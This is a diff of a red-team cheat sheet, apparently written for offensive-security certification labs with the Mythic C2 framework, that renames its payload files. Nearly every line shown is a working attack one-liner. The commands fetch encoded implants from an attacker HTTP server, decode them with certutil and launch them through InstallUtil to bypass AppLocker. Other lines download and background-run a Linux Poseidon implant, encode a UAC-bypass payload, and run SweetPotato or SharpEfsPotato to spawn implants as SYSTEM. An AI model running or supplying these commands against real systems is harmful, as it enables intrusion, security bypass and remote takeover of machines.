@@ -107,7 +107,7 @@ python -m http.server 8080 --bind 192.168.45.90
 
 To update the Mythic config files the best option is just crate a Payload using the Mythic web GUI, configuring everything and when the Payload is ready, click `ACTIONS` and `Export Payload Config`. That will download the `apollo.exe.json` config file that can replace the current one. 
 
-> Note: The `apollo.exe.json`  must have that name to be used in the script, next to `apollo.bin.json` and `poseidon.bin.json`. 
+> Note: The `apollo.exe.json`  must have that name to be used in the script, next to `apollo.bin.json` and `poseidon-osep.bin.json`. 
 
 ![Export Cusom Config](img/export-config.png)
 
@@ -166,13 +166,13 @@ python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebCli
 Download an encoded edited version of `NetLoader`, decode it to an executable, then execute it via `InstallUtil` to bypass AppLocker.
 
 ```
-shell "powershell iwr -uri http://192.168.45.90:8080/utils/enc.txt -outfile C:\\windows\\Tasks\\enc.txt;powershell rm C:\\windows\\Tasks\\proc.exe;powershell certutil -decode C:\\windows\\Tasks\\enc.txt C:\\windows\\Tasks\\proc.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=/LogToConsole=false /path=http://192.168.45.90:8080/apollo-local.exe /U C:\\windows\\Tasks\\proc.exe"
+shell "powershell iwr -uri http://192.168.45.90:8080/utils/enc.txt -outfile C:\\windows\\Tasks\\enc.txt;powershell rm C:\\windows\\Tasks\\proc.exe;powershell certutil -decode C:\\windows\\Tasks\\enc.txt C:\\windows\\Tasks\\proc.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=/LogToConsole=false /path=http://192.168.45.90:8080/apollo-osep.exe /U C:\\windows\\Tasks\\proc.exe"
 ```
 
 Same chain without the outer `shell` quoting for direct PowerShell command.
 
 ```
-powershell iwr -uri http://192.168.45.90:8080/utils/enc.txt -outfile C:\windows\Tasks\enc.txt;powershell rm C:\windows\Tasks\proc.exe;powershell certutil -decode C:\windows\Tasks\enc.txt C:\windows\Tasks\proc.exe; C:\windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile=/LogToConsole=false /path=http://192.168.45.90:8080/apollo-local.exe /U C:\windows\Tasks\proc.exe"
+powershell iwr -uri http://192.168.45.90:8080/utils/enc.txt -outfile C:\windows\Tasks\enc.txt;powershell rm C:\windows\Tasks\proc.exe;powershell certutil -decode C:\windows\Tasks\enc.txt C:\windows\Tasks\proc.exe; C:\windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile=/LogToConsole=false /path=http://192.168.45.90:8080/apollo-osep.exe /U C:\windows\Tasks\proc.exe"
 ```
 
 ### One liner Linux
@@ -180,7 +180,7 @@ powershell iwr -uri http://192.168.45.90:8080/utils/enc.txt -outfile C:\windows\
 Download a Poseidon binary to `/tmp`, make it executable, then run it in the background.
 
 ```
-cd /tmp ; wget http://192.168.45.90:8080/poseidon.bin ; chmod +x /tmp/poseidon.bin ; /tmp/poseidon.bin & 
+cd /tmp ; wget http://192.168.45.90:8080/poseidon-osep.bin ; chmod +x /tmp/poseidon-osep.bin ; /tmp/poseidon-osep.bin & 
 ```
 
 ### Bloodhound
@@ -372,7 +372,7 @@ $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 Build an encoded PowerShell string for a UAC bypass payload.
 
 ```
-$script = "powershell iwr -uri http://192.168.45.90:8080/enc.txt -outfile C:\\windows\\Tasks\\enc.txt;powershell rm C:\\windows\\Tasks\\proc.exe;powershell certutil -decode C:\\windows\\Tasks\\enc.txt C:\\windows\\Tasks\\proc.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=/LogToConsole=false /path=http://192.168.45.90:8080/apollo-local.exe /U C:\\windows\\Tasks\\proc.exe"
+$script = "powershell iwr -uri http://192.168.45.90:8080/enc.txt -outfile C:\\windows\\Tasks\\enc.txt;powershell rm C:\\windows\\Tasks\\proc.exe;powershell certutil -decode C:\\windows\\Tasks\\enc.txt C:\\windows\\Tasks\\proc.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=/LogToConsole=false /path=http://192.168.45.90:8080/apollo-osep.exe /U C:\\windows\\Tasks\\proc.exe"
 
 [Convert]==ToBase64String([Text.Encoding]==Unicode.GetBytes($script))
 ```
@@ -420,13 +420,13 @@ Run SweetPotato or EfsPotato style escalation to spawn a payload as SYSTEM.
 ```
 #register_assembly SweetPotato.exe
 
-execute_assembly {"assembly_name":"SweetPotato.exe","assembly_arguments":"-p C:\\temp\\apollo-local.exe"}
+execute_assembly {"assembly_name":"SweetPotato.exe","assembly_arguments":"-p C:\\temp\\apollo-osep.exe"}
 ```
 
 ```
 upload - SharpEfsPotato
 upload - NetLoader
-shell c:\temp\SharpEfsPotato.exe -p C:\temp\NetLoader.exe -a "-Path http://192.168.45.90:8080/apollo-local.exe"
+shell c:\temp\SharpEfsPotato.exe -p C:\temp\NetLoader.exe -a "-Path http://192.168.45.90:8080/apollo-osep.exe"
 ```
 
 ### Socks
